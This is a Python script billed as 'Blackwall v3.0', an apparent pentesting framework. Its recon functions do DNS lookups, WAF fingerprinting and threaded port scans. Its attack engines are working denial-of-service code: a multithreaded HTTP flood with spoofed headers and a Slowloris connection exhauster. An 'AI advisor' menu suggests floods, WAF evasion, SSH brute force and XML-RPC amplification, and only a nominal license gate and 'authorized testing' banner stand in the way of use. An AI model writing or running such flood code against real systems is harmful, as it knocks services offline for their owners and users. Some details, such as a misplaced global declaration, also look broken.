#!/usr/bin/env python3
"""
Blackwall v3.0 - Ultimate Pentesting Framework
Author: kavikd | ASSAII Terminal Edition
Complete Recon + Attack + AI Framework
"""

import os
import sys
import time
import socket
import random
import threading
import hashlib
import getpass
import webbrowser
from urllib.parse import urlparse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import json
from urllib3.exceptions import InsecureRequestWarning
import dns.resolver

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ================== ASSAII COLORS ==================
NEON_BLUE   = "\033[96m"
NEON_GREEN  = "\033[92m"
NEON_PURPLE = "\033[95m"
NEON_YELLOW = "\033[93m"
NEON_RED    = "\033[91m"
NEON_CYAN   = "\033[96m"
BOLD        = "\033[1m"
BLINK       = "\033[5m"
UNDERLINE   = "\033[4m"
RESET       = "\033[0m"

# ================== GLOBAL STATE ==================
packets_sent = 0
bytes_sent = 0
scan_results = {}
target_url = ""
target_ip = ""
threads_running = False
attack_active = False

# ================== ATTACK PAYLOADS ==================
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    # Add 50+ more realistic UAs
]

REFERERS = [
    'https://www.google.com',
    'https://www.bing.com',
    'https://duckduckgo.com',
    # Add more
]

# ================== UI HELPERS ==================
def clear():
    os.system("clear" if os.name == "posix" else "cls")

def slow_print(text, delay=0.03, color=NEON_GREEN):
    for c in text:
        sys.stdout.write(color + c)
        sys.stdout.flush()
        time.sleep(delay)
    print(RESET)

def loading_bar(duration=3, width=50):
    chars = "█▉▊▋▌▍▎▏"
    for i in range(width + 1):
        char_idx = int((i / width) * len(chars))
        progress = chars[char_idx] * i + "░" * (width - i)
        sys.stdout.write(f"\r{NEON_GREEN}[{progress}] {int(i/width*100):3d}%")
        sys.stdout.flush()
        time.sleep(duration / width)
    print(RESET + "\n")

# ================== BLACKWALL ASSAII BANNER ==================
def print_blackwall_banner():
    clear()
    print(NEON_BLUE + BLINK + BOLD + UNDERLINE)
    print(r"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║  ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗                                 ║
║  ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗                                ║
║  ███████║███████║██║     █████╔╝ █████╗  ██████╔╝                                ║
║  ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗                                ║
║  ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║                                ║
║  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝                                 ║
║                                                                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  v3.0 ULTIMATE  │  kavikd  │  Recon • AI • Multi-Vector Attacks  │  2026      ║
║                                                                              ║
║  🎯 Recon Dashboard  │  ⚡ HTTP/Slowloris  │  🤖 AI Attack Advisor  │  📊 Stats  ║
╚══════════════════════════════════════════════════════════════════════════════╝
    """)
    print(RESET)

# ================== LICENSE VERIFICATION ==================
LICENSE_HASH = "bcf097e7520fc41a004b13bcf389d939"  # UnderKuttyEthics

def verify_license():
    clear()
    print(NEON_PURPLE + BOLD)
    print("""
╔═══════════════════════════════════════════════════════════════╗
║                   🔐 BLACKWALL LICENSE 🔐                     ║
║                                                               ║
║  • Authorized Penetration Testing Only                        ║
║  • Multi-Vector Attack Capabilities                           ║
║  • AI-Powered Attack Recommendations                          ║
║                                                               ║
║              Protected by MD5 Authentication                  ║
║                   kavikd @ 2026                               ║
╚═══════════════════════════════════════════════════════════════╝
    """)
    print(RESET)
    
    print(NEON_BLUE + "🔑 Authentication required:\n")
    key = getpass.getpass("blackwall@license ~# ")
    
    if hashlib.md5(key.encode()).hexdigest() != LICENSE_HASH:
        slow_print(NEON_RED + "❌ ACCESS DENIED - Invalid License Key", color=NEON_RED)
        sys.exit(1)
    
    print(NEON_GREEN + "✅ LICENSE VERIFIED - Blackwall Unlocked")
    loading_bar(3)
    
    slow_print(NEON_CYAN + "🚀 Initializing Blackwall v3.0 Ultimate...", color=NEON_CYAN)

# ==================== CORE RECON ENGINE ====================
def resolve_dns(target):
    """DNS Resolution + Subdomain hints"""
    try:
        ips = [str(rdata) for rdata in dns.resolver.resolve(target, 'A')]
        return ips[0] if ips else None
    except:
        return socket.gethostbyname(target)

def detect_security(target):
    """Comprehensive WAF/CDN Detection"""
    waf_signatures = {
        'cloudflare': ['cloudflare', 'cf-ray'],
        'akamai': ['akamai', 'x-akamai'],
        'aws': ['cloudfront', 'x-amz'],
        'f5': ['f5', 'big-ip']
    }
    
    try:
        resp = requests.get(target, timeout=8, verify=False)
        headers = {k.lower(): v.lower() for k, v in resp.headers.items()}
        
        for waf, sigs in waf_signatures.items():
            if any(sig in str(headers) for sig in sigs):
                return waf.title()
    except:
        pass
    return "None"

def advanced_port_scan(target, common_ports=[21,22,23,25,53,80,110,143,443,993,995,8080,8443]):
    """Multi-threaded port scanning"""
    open_ports = []
    
    def scan_port(port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.8)
        result = sock.connect_ex((target, port))
        sock.close()
        return port if result == 0 else None
    
    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = [executor.submit(scan_port, port) for port in common_ports]
        for future in as_completed(futures):
            result = future.result()
            if result:
                open_ports.append(result)
    
    return sorted(open_ports)

def xmlrpc_check(target):
    """WordPress XML-RPC detection"""
    try:
        resp = requests.get(f"{target}/xmlrpc.php", timeout=5)
        return resp.status_code == 200
    except:
        return False

def websocket_check(target):
    """WebSocket capability check"""
    try:
        resp = requests.get(target, timeout=5)
        return 'websocket' in resp.headers.get('sec-websocket', '').lower()
    except:
        return False

def full_recon_scan(target_host):
    """Complete reconnaissance suite"""
    print(NEON_YELLOW + "[+] Executing full reconnaissance scan..." + RESET)
    
    results = {
        'target': target_host,
        'ip': resolve_dns(target_host),
        'security': detect_security(f"http://{target_host}"),
        'ports': advanced_port_scan(target_host),
        'xmlrpc': xmlrpc_check(f"http://{target_host}"),
        'websocket': websocket_check(f"http://{target_host}"),
        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    
    global scan_results
    scan_results = results
    return results

# ==================== ATTACK ENGINES ====================
def http_flood_worker(target, duration, worker_id):
    """Advanced HTTP Flood worker"""
    global packets_sent, bytes_sent
    end_time = time.time() + duration
    
    session = requests.Session()
    session.headers.update({
        'User-Agent': random.choice(USER_AGENTS),
        'Referer': random.choice(REFERERS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
    })
    
    while time.time() < end_time and threads_running:
        try:
            resp = session.get(target, timeout=3, verify=False)
            packets_sent += 1
            bytes_sent += len(resp.content)
        except:
            pass
        time.sleep(random.uniform(0.01, 0.05))  # Jitter

def slowloris_worker(target, duration):
    """Slowloris DoS attack"""
    global packets_sent
    end_time = time.time() + duration
    
    sockets = []
    for _ in range(200):  # Max partial connections
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((target, 80))
            sock.send(f"GET /?{random.randint(0,2000)} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {target}\r\n".encode())
            sockets.append(sock)
        except:
            continue
    
    while time.time() < end_time and threads_running:
        for sock in sockets[:]:
            try:
                sock.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
            except:
                sockets.remove(sock)
        time.sleep(0.5)

def launch_attack(attack_type, threads=100, duration=60):
    """Multi-vector attack launcher"""
    global threads_running, attack_active, target_ip
    
    if not target_ip:
        print(NEON_RED + "❌ Target not scanned!" + RESET)
        return
    
    threads_running = True
    attack_active = True
    
    print(NEON_RED + f"\n⚡ LAUNCHING {attack_type.upper()} ATTACK")
    print(f"  🎯 Target: {target_ip}")
    print(f"  🧵 Threads: {threads}")
    print(f"  ⏱️  Duration: {duration}s")
    print("  🚀 ATTACK ACTIVE - Ctrl+C to stop\n" + RESET)
    
    if attack_type == "http":
        target = f"http://{target_ip}"
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(http_flood_worker, target, duration, i) 
                      for i in range(threads)]
            try:
                for future in as_completed(futures):
                    future.result()
            except KeyboardInterrupt:
                pass
    
    elif attack_type == "slowloris":
        slowloris_thread = threading.Thread(target=slowloris_worker, 
                                          args=(target_ip, duration))
        slowloris_thread.start()
        try:
            slowloris_thread.join(duration)
        except KeyboardInterrupt:
            pass
    
    threads_running = False
    attack_active = False
    print_stats()

# ==================== AI RECOMMENDATION ENGINE ====================
def ai_attack_recommendations():
    """Intelligent attack vector recommendations"""
    if not scan_results:
        return ["Run reconnaissance first (option 1)"]
    
    recommendations = []
    
    # WAF/CDN bypass logic
    if scan_results['security'] != 'None':
        recommendations.append(f"🛡️ {scan_results['security']} detected - Use Slowloris or IP rotation")
    
    # Port-based recommendations
    ports = scan_results['ports']
    if 80 in ports or 443 in ports:
        recommendations.append("🌐 HTTP Flood recommended - Web services exposed")
    if 22 in ports:
        recommendations.append("🔓 SSH detected - Consider brute force")
    if scan_results['xmlrpc']:
        recommendations.append("🗯️ WordPress XML-RPC - DDoS amplification possible")
    
    if not recommendations:
        recommendations.append("⚡ Full HTTP Flood - No protections detected")
    
    return recommendations

# ==================== REAL-TIME STATS DASHBOARD ====================
def print_stats():
    """Attack statistics display"""
    print(NEON_PURPLE + BOLD + "\n📊 BLACKWALL ATTACK STATISTICS" + RESET)
    print(f"  🎯 Target: {target_url or target_ip}")
    print(f"  📦 Packets: {packets_sent:,}")
    print(f"  📊 Bytes: {bytes_sent:,} ({bytes_sent/1024/1024:.1f} MB)")
    print(f"  💾 PPS: {packets_sent/60:.0f}" if packets_sent else "  💾 PPS: 0")
    print(f"  🛡️ WAF: {scan_results.get('security', 'Unknown')}")
    print(f"  🔓 Ports: {len(scan_results.get('ports', []))}")

def live_dashboard():
    """Real-time monitoring dashboard"""
    try:
        while attack_active:
            clear()
            print_blackwall_banner()
            print_stats()
            time.sleep(2)
    except KeyboardInterrupt:
        pass

# ==================== MAIN PROGRAM PATH ====================
def main_menu():
    """Primary navigation menu"""
    print(NEON_BLUE + BOLD + "══════════════ 🛡️ BLACKWALL v3.0 ══════════════\n" + RESET)
    
    print(f"{NEON_GREEN}1{NEON_CYAN}  🎯  Target Recon & Fingerprinting")
    print(f"{NEON_GREEN}2{NEON_CYAN}  ⚡  Launch Multi-Vector Attack")
    print(f"{NEON_GREEN}3{NEON_CYAN}  🤖  AI Attack Recommendations")
    print(f"{NEON_GREEN}4{NEON_CYAN}  📊  Live Attack Dashboard")
    print(f"{NEON_GREEN}5{NEON_CYAN}  🔧  Attack Configuration")
    print(f"{NEON_GREEN}6{NEON_CYAN}  📚  Pentest Resources")
    print(f"{NEON_RED}0{NEON_YELLOW}   🚪  Exit Framework{RESET}\n")

def resource_menu():
    """Pentesting resources"""
    resources = {
        "1": ("The Art of Exploitation", "https://archive.org/details/ArtOfExploitation"),
        "2": ("Web Application Hacker's Handbook", "https://www.wahhbook.com/"),
        "3": ("Metasploit: The Penetration Tester's Guide", "https://www.nostarch.com/metasploit")
    }
    
    print(NEON_GREEN + "\n📚 PROFESSIONAL RESOURCES:\n")
    for k, (title, link) in resources.items():
        print(f"  {k} - {title}")
    print("  0 - Back")
    
    choice = input(NEON_BLUE + "📖 Selection: " + RESET).strip()
    if choice in resources:
        print(f"\n🌐 Opening: {resources[choice][0]}")
        webbrowser.open(resources[choice][1])

# ==================== MAIN EXECUTION FLOW ====================
def main():
    """Blackwall Main Program Entry"""
    
    # Phase 1: Authentication
    verify_license()
    
    # Phase 2: Main Loop
    while True:
        try:
            print_blackwall_banner()
            main_menu()
            
            choice = input(NEON_BLUE + BOLD + "blackwall@ultimate ~# " + RESET).strip()
            
            if choice == "1":  # RECON
                target = input(NEON_CYAN + "\n🌐 Target domain/IP: " + RESET).strip()
                if target:
                    global target_url, target_ip
                    target_ip = resolve_dns(target)
                    target_url = f"http://{target}"
                    full_recon_scan(target)
                    print(NEON_GREEN + "\n✅ RECON COMPLETE - Results saved")
                    input("\n[Enter] Continue...")
            
            elif choice == "2":  # ATTACK
                if not target_ip:
                    print(NEON_RED + "❌ Scan target first!")
                    input("\n[Enter]...")
                    continue
                
                print(f"\n{NEON_YELLOW}🎯 Locked: {target_ip}")
                print("1 - HTTP Flood")
                print("2 - Slowloris")
                attack_choice = input("⚡ Attack type: ").strip()
                
                if attack_choice == "1":
                    launch_attack("http", 200, 60)
                elif attack_choice == "2":
                    launch_attack("slowloris", 1, 120)
                input("\n[Enter]...")
            
            elif choice == "3":  # AI RECOMMENDATIONS
                recs = ai_attack_recommendations()
                print(NEON_PURPLE + "\n🤖 AI ATTACK ADVISOR:\n")
                for i, rec in enumerate(recs, 1):
                    print(f"  {i}. {rec}")
                input("\n[Enter]...")
            
            elif choice == "4":  # DASHBOARD
                print_stats()
                input("\n[Enter]...")
            
            elif choice == "5":  # CONFIG
                print(NEON_YELLOW + "\n🔧 Attack Configuration:")
                print(f"  Threads: Adjustable in attack menu")
                print(f"  Duration: Adjustable in attack menu")
                print(f"  Vectors: HTTP, Slowloris, UDP (coming soon)")
                input("\n[Enter]...")
            
            elif choice == "6":  # RESOURCES
                resource_menu()
            
            elif choice == "0":
                slow_print(NEON_RED + "\n🔒 Blackwall v3.0 terminated. Stay ethical.", color=NEON_RED)
                break
            
            else:
                print(NEON_RED + "❌ Invalid selection")
                time.sleep(1)
                
        except KeyboardInterrupt:
            print(NEON_RED + "\n\n⚠️  Interrupt received - Cleaning up...")
            global threads_running
            threads_running = False
            time.sleep(1)
            continue
        except Exception as e:
            print(NEON_RED + f"\n❌ Error: {e}")
            time.sleep(2)

if __name__ == "__main__":
    main()
